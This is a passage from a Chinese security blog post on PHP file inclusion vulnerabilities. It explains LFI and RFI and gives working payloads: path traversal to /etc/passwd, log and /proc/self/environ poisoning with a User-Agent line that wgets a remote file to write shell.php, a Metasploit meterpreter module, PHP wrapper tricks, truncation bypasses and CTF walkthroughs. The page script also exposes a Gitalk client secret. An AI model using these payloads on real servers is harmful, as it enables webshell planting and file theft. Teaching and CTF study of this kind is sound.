class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#路径长度截断"><span class="toc-text">路径长度截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意文件读取"><span class="toc-text">任意文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含利用方式整理"><span class="toc-text">文件包含利用方式整理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#中间件安全配置"><span class="toc-text">中间件安全配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>   文章首发于<a href="https://cloud.tencent.com/developer/article/1180857" target="_blank" rel="external">信安之路</a>,转载请注明来源</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
+<p>php中引发文件包含漏洞的通常是以下四个函数：</p>
+<ol>
+<li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a>   当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</li>
+<li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a>   功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</li>
+<li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a>  只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li>
+<li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a> 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</li>
+</ol>
+<p>当使用这四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程url、也都将作为PHP代码执行。这一特性，在实施攻击时非常有用。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>(1)include等函数通过动态执行变量的方式引入需要包含的文件；</p>
+<p>(2)用户能控制该动态变量。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。</p>
+<p>1、本地文件包含LFI(Local File Include)</p>
+<p> 2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on  allow_url_fopen = On）</p>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
+<h2 id="一、本地包含"><a href="#一、本地包含" class="headerlink" title="一、本地包含"></a>一、本地包含</h2><h3 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h3><p>?file=test.txt</p>
+<h3 id="目录遍历："><a href="#目录遍历：" class="headerlink" title="目录遍历："></a>目录遍历：</h3><p>?file=./../../test.txt<br>./当前目录,../上一级目录,这样的遍历目录来读取文件</p>
+<h3 id="包含图片木马"><a href="#包含图片木马" class="headerlink" title="包含图片木马"></a>包含图片木马</h3><p>命令行下执行：<code>copy x.jpg /b + s.php /b f.jpg</code></p>
+<p>上传 f.jpg</p>
+<p>找到 f.jpg 路径</p>
+<p>包含 f.jpg</p>
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+<p>apache服务器的默认日志地址为：<code>/var/log/apache2/access.log</code></p>
+<p>nginx服务器的默认日志地址为：<code>/var/log/nginx/access.log</code></p>
+<p>?file=/etc/httpd/httpd.conf</p>
+<p>可以找到errorlog的位置。</p>
+<p>构造url为：<code>http://xxxx/&lt;?php phpinfo();?&gt;</code>，请求之后，包含日志文件</p>
+<p>include(‘/var/log/apache2/access.log’)，从而成功执行php代码</p>
+<p> ?file=../../../../../../../../../var/log/apache/error.log </p>
+<p>1.</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032017_676.png" alt=""></p>
+<p>​   </p>
+<p>2.可以尝试利用UA插入payload到日志文件</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032021_793.png" alt=""></p>
+<p>3.MSF攻击模块</p>
+<pre><code>use exploit/unix/webapp/php_include
+set rhost 192.168.159.128
+set rport 80
+set phpuri /index.php?file=xxLFIxx
+set path http://172.18.176.147/
+set payload php/meterpreter/bind_tcp
+set srvport 8888
+exploit -z
+</code></pre><p><strong>日志默认路径</strong></p>
+<p>(1) apache+Linux日志默认路径</p>
+<pre><code>/etc/httpd/logs/access_log
+</code></pre><p>或者</p>
+<pre><code>/var/log/httpd/access log
+</code></pre><p> (2) apache+win2003日志默认路径</p>
+<pre><code>D:xamppapachelogsaccess.log
+D:xamppapachelogserror.log
+</code></pre><p>(3) IIS6.0+win2003默认日志文件</p>
+<pre><code>C:WINDOWSsystem32Logfiles
+</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p>
+<pre><code>%SystemDrive%inetpublogsLogFiles
+</code></pre><p>(5) nginx 日志文件在用户安装目录的logs目录下</p>
+<p>如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里</p>
+<p>也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</p>
+<p><strong>2）web中间件默认配置</strong></p>
+<p> (1) apache+linux 默认配置文件</p>
+<pre><code>/etc/httpd/conf/httpd.conf
+</code></pre><p>或者</p>
+<pre><code>index.php?page=/etc/init.d/httpd
+</code></pre><p>(2) IIS6.0+win2003 配置文件</p>
+<p>C:/Windows/system32/inetsrv/metabase.xml </p>
+<p>(3) IIS7.0+WIN 配置文件</p>
+<p>C:WindowsSystem32inetsrvconfigapplicationHost.config</p>
+<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>PHP默认生成的Session文件往往存放在/tmp目录下<br>/tmp/sess_SESSIONID</p>
+<p>/var/lib/php/session/sess_SESSIONID</p>
+<p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p>
+<p>（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p>
+<h3 id="包含-proc-self-environ文件"><a href="#包含-proc-self-environ文件" class="headerlink" title="包含/proc/self/environ文件"></a>包含/proc/self/environ文件</h3><p>利用条件：</p>
+<ol>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>姿势：</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p>?file=../../../../../../../proc/self/environ</p>
+<p>选择User-Agent 写代码如下：</p>
+<pre><code>&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;
+</code></pre><p>然后提交请求。</p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140916_975.png" alt=""></p>
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p>
+<h2 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h2><p>文件名后缀固定：在包含的文件名后加固定后缀</p>
+<p>文件名过滤 :使用switch array限制可以包含的文件名</p>
+<p>审计中可见这样的包含模版文件：</p>
+<pre><code class="php">&lt;?php
+    $file = $_GET[&#39;file&#39;];
+    include &#39;/var/www/html/&#39;.$file.&#39;/test/test.php&#39;;
+?&gt;
+</code></pre>
+<p>这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。</p>
+<ol>
+<li><p>%00截断</p>
+<p> 能利用00截断的场景现在应该很少了</p>
+<p> PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p>
+<p> ?file=../../../../../../../../../etc/passwd%00</p>
+<p> 文件系统获取含有换行符的文件名，会截断为../../../ect/passwd</p>
+<p> (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
+</li>
+<li><p>%00截断目录遍历：</p>
+<p> ?file=../../../../../../../../../var/www/%00<br> (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
+</li>
+<li><p>路径长度截断：</p>
+<p> ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br> (php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<p> 利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p>
+<p> 我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br> 而利用”./“的方式即可构造出超长目录字符串:</p>
+</li>
+<li><p>点号截断：</p>
+<p> ?file=../../../../../../../../../boot.ini/………[…]…………<br> (php版本小于5.2.8可以成功，只适用windows，点号需要长于256)</p>
+</li>
+<li><p>编码绕过</p>
+<p> 服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li>利用url编码<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/  </li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>二次编码</p>
+<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+<p>6.~绕过</p>
+<p>针对目录限制</p>
+<p>？file=~/../phpinfo这样的代码。其中~就是尝试是否可以直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录</p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="二、远程文件包含"><a href="#二、远程文件包含" class="headerlink" title="二、远程文件包含"></a>二、远程文件包含</h2><pre><code>?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp
+</code></pre><h2 id="有防御的远程文件包含"><a href="#有防御的远程文件包含" class="headerlink" title="有防御的远程文件包含"></a>有防御的远程文件包含</h2><pre><code class="php">&lt;?php 
+    $basePath = $_GET[&#39;path&#39;];
+    require_once $basePath . &quot;/action/m_share.php&quot;;  
+?&gt;
+</code></pre>
+<p>攻击者可以构造类似如下的攻击URL</p>
+<pre><code class="url">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
+=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23
+</code></pre>
+<p>产生的原理:</p>
+<pre><code>/?path=http://localhost/test/solution.php?
+最终目标应用程序代码实际上执行了:
+require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;
+(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)
+攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合
+</code></pre><h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h2><p><a href="http://cn2.php.net/manual/zh/wrappers.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/wrappers.php</a></p>
+<pre><code>file:///var/www/html  访问本地文件系统
+ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs
+data://  数据流
+http:// — 访问 HTTP(s) URLs
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流
+zlib:// — 压缩流
+data:// — Data (RFC 2397)
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP Archive
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — Audio streams
+expect:// — 处理交互式的流
+</code></pre><h3 id="利用php流input："><a href="#利用php流input：" class="headerlink" title="利用php流input："></a>利用php流input：</h3><p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<pre><code>index.php
+?file=php://input
+
+POST:
+&lt;? phpinfo();?&gt;
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032124_161.png" alt=""></p>
+<p>结果将在index.php所在文件下的文件shell.php内增加”&lt;?php phpinfo();?&gt;”一句话</p>
+<h3 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h3><p>?file=php://filter/convert.base64-encode/resource=index.php</p>
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
+<p>其他姿势：</p>
+<pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php
+</code></pre><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
+<h3 id="利用data-URIs："><a href="#利用data-URIs：" class="headerlink" title="利用data URIs："></a>利用data URIs：</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>
+<pre><code>?file=data:text/plain,&lt;?php phpinfo();?&gt;
+?file=data:text/plain;base64,base64编码的payload
+index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;
+</code></pre><p>(需要allow_url_include=On)</p>
+<h3 id="利用XSS执行任意代码："><a href="#利用XSS执行任意代码：" class="headerlink" title="利用XSS执行任意代码："></a>利用XSS执行任意代码：</h3><p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="external">http://127.0.0.1/path/xss.php?xss=phpcode</a></p>
+<p>利用条件：</p>
+<ol>
+<li>allow_url_fopen = On</li>
+<li>并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊</li>
+</ol>
+<h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// 查找匹配的文件路径模式</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>理解：</p>
+<p>如果服务器只允许包含.php文件，后台代码为：<code>include(xxx + &#39;.php&#39;);</code>，而这个.php文件不可控。但是我们可以上传一个.txt文件，那么我们可以通过phar伪协议来包含这个文件，而且phar协议不以后缀名判断文件类型，所以我们将我们的test.php木马压缩以后改为a.txt文件上传到服务器上，之后可以构造payload：phar://a.txt/test，服务器拼接以后就成为了：phar://a.txt/test.php，即可成功包含 </p>
+<p>姿势：</p>
+<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140917_301.png" alt=""></p>
+<p>指定绝对路径</p>
+<pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
+</code></pre><p>或者使用相对路径（这里test.zip就在当前目录下）</p>
+<pre><code>index.php?file=phar://test.zip/phpinfo.txt
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140917_297.png" alt=""></p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<pre><code>&lt;?php
+$file = $_GET[&#39;file&#39;];
+if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
+    include($file);
+}
+?&gt;
+</code></pre><p>截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含</p>
+<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
+<p>然后我们构造zip://php.zip#php.jpg</p>
+<pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg
+</code></pre><p>注意事项：</p>
+<ol>
+<li>若是使用相对路径，则会包含失败。</li>
+<li>协议原型：zip://archive.zip#dir/file.txt</li>
+<li>注意url编码,因为这个#会和url协议中的#冲突</li>
+</ol>
+<h2 id="CTF中的文件包含套路"><a href="#CTF中的文件包含套路" class="headerlink" title="CTF中的文件包含套路"></a>CTF中的文件包含套路</h2><h3 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h3><p>点击login，发现链接变为：</p>
+<pre><code>http://54.222.188.152:1/index.php
+?action=login.php
+</code></pre><p>推测文件包含 访问：</p>
+<pre><code>http://54.222.188.152:1/index.php
+?action=php://filter/read=convert.base64-encode/resource=login.php
+</code></pre><p>得到源码</p>
+<h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>iscc2018的一道题目</p>
+<p>打开题目</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140857_654.png" alt=""></p>
+<p>查看源码<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140858_867.png" alt=""></p>
+<p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140901_199.png" alt=""></p>
+<p>大概可以猜测 文件包含漏洞，尝试</p>
+<pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php
+</code></pre>
+<p>但是不行</p>
+<p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p>
+<p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+ini_set(&#39;display_errors&#39;,&#39;Off&#39;);
+
+include(&#39;config.php&#39;);
+
+$img = $_GET[&#39;img&#39;];
+if(isset($img) &amp;&amp; !empty($img))
+{
+    if(strpos($img,&#39;jpg&#39;) !== false)
+    {
+        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)
+        {
+            die(&#39;File not found.&#39;);
+        }
+
+        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);
+        if(isset($matches[1]))
+        {
+            $img = $matches[1];
+        }
+
+        header(&#39;Content-Type: image/jpeg&#39;);
+        $data = get_contents($img);
+        echo $data;
+    }
+    else
+    {
+        die(&#39;File not found.&#39;);
+    }
+
+}
+else
+{
+    ?&gt;
+    &lt;img src=&quot;1.jpg&quot;&gt;
+    &lt;?php
+}
+?&gt;
+</code></pre>
+<ol>
+<li>开头包含了config.php</li>
+<li>img必须有jpg但又不能有resource=.*jpg</li>
+<li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li>
+</ol>
+<p>知道了config.php再去访问明白为什么必须包含jpg</p>
+<pre><code class="php">&lt;?php
+function get_contents($img)
+{
+        if(strpos($img,&#39;jpg&#39;) !== false)
+        {
+                return file_get_contents($img);
+        }
+        else
+        {
+                header(&#39;Content-Type: text/html&#39;);
+                return file_get_contents($img);
+        }
+}
+?&gt;
+</code></pre>
+<p>最终payload:</p>
+<p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>要求：</p>
+<ul>
+<li>php版本小于5.3.4</li>
+<li>magic_quotes_gpc为off状态</li>
+</ul>
+<p>大多数的文件包含漏洞都是需要截断的，因为正常程序里面包含的文件代码一般是include(BASEPATH.$mod.’.php’)或者include($mod.’.php’)这样的方式，如果我们不能写入.php为扩展名的文件，那我们是需要截断来利用的</p>
+<p>受限与gpc和addslashes等函数的过滤，另外，php5.3之后的版本全面修复了%00截断的问题</p>
+<pre><code class="php">&lt;?php
+
+include($_GET[&#39;a&#39;].&#39;.php&#39;)
+
+?&gt;
+</code></pre>
+<p>上传我们的2.txt文件,请求<a href="http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码" target="_blank" rel="external">http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码</a> </p>
+<p>列子二</p>
+<p>漏洞文件index.php</p>
+<pre><code>&lt;?php
+if (empty($_GET[&quot;file&quot;])){
+    echo(&#39;../flag.php&#39;);
+    return;
+}
+else{
+    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;
+    include $filename;
+}
+?&gt;
+</code></pre><p>flag文件放在上层目录</p>
+<p>这里限制了后缀名，我们需要通过截断才能访问到flag文件 利用代码：</p>
+<pre><code>index.php?file=../../flag.php%00
+</code></pre><p>%00 会被解析为0x00，所以导致截断的发生 我们通过截断成功的绕过了后缀限制</p>
+<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>我们现在已经知道使用%00截断有两个条件php版本小于5.3.4和magic_quotes_gpc为off状态。 如果这时我们将magic_quotes_gpc改为on那么就不能截断了，因为开启magic_quotes_gpc后%00会被加上一个反斜杠转义掉</p>
+<p><img src="https://pic3.zhimg.com/80/v2-4ae67b246f19f5fe0d2355c77021bfef_hd.jpg" alt="img"></p>
+<p>那么我们这时候有没有办法绕过这个限制呢？有一个条件那就是php版本小于5.3.10 我们的代码依旧不变 漏洞文件index.php</p>
+<pre><code>&lt;?php
+if (empty($_GET[&quot;file&quot;])){
+    echo(&#39;../flag.php&#39;);
+    return;
+}
+else{
+    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;
+    include $filename;
+}
+?&gt;
+</code></pre><p>flag文件放在上层目录 这时我们可以使用字符 .    /.   和  ./  来进行绕过，因为文件路径有长度限制</p>
+<ul>
+<li>windows 259个bytes</li>
+<li>linux 4096个bytes</li>
+</ul>
+<p>在windows下需要.字符最少的利用POC1：</p>
+<pre><code>file=../../flag.php..............................................................................................................................................................................................................................................
+</code></pre><p><img src="https://pic2.zhimg.com/80/v2-727b4d978c8ed0f1676673c26851761d_hd.jpg" alt="img"></p>
+<p>在windows下需要.字符最少的利用POC2：</p>
+<pre><code>file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
+</code></pre><p><img src="https://pic1.zhimg.com/80/v2-9ca3a3374552ee9db6dc65c999b21a3a_hd.jpg" alt="img"></p>
+<p>将flag.php改为flag1.php 在windows下需要.字符最少的利用POC3：</p>
+<pre><code>file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
+</code></pre><p><img src="https://pic4.zhimg.com/80/v2-a9471dd64354a01407e18a5a1cccb2b9_hd.jpg" alt="img"></p>
+<p>我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3</p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>file_get_contents最常见的文件读取函数</p>
+<p>?dir=/data/web.config</p>
+<h2 id="文件包含利用方式整理"><a href="#文件包含利用方式整理" class="headerlink" title="文件包含利用方式整理"></a>文件包含利用方式整理</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806161007_364.png" alt=""></p>
+<h2 id="中间件安全配置"><a href="#中间件安全配置" class="headerlink" title="中间件安全配置"></a>中间件安全配置</h2><ul>
+<li>magic_qutes_gpc</li>
+<li>限制访问区域</li>
+<li>设置访问权限</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806161021_780.png" alt=""></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 72382781@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span>文章标题:</span>php文件包含漏洞</p>
+    <p><span>文章字数:</span><span class="post-count">4,055</span></p>
+    <p><span>本文作者:</span><a href="javascript:void(0)" title="Bigbroke">Bigbroke</a></p>
+    <p><span>发布时间:</span>2018-04-23, 21:39:49</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:15</p>
+    <span>原始链接:</span><a class="post-url" href="/archis/844a29d4/" title="php文件包含漏洞">http://Bigbroke.com/archis/844a29d4/</a>
+    <p>
+        <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="/css/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: 'eb679ffbe3e667bef087',
+            clientSecret: '803d24db3cf86013b1c74778931b9e6670081459',
+            repo: 'bigbroke.github.io',
+            owner: 'bigbroke',
+            admin: ['bigbroke'],
+            id: location.pathname,
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+    
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2018 Bigbroke</p>
+<p class="footer-entry">Buit with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":150},"mobile":{"show":true},"log":false});</script></body>
+<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe-ui-default.min.js"></script>
+
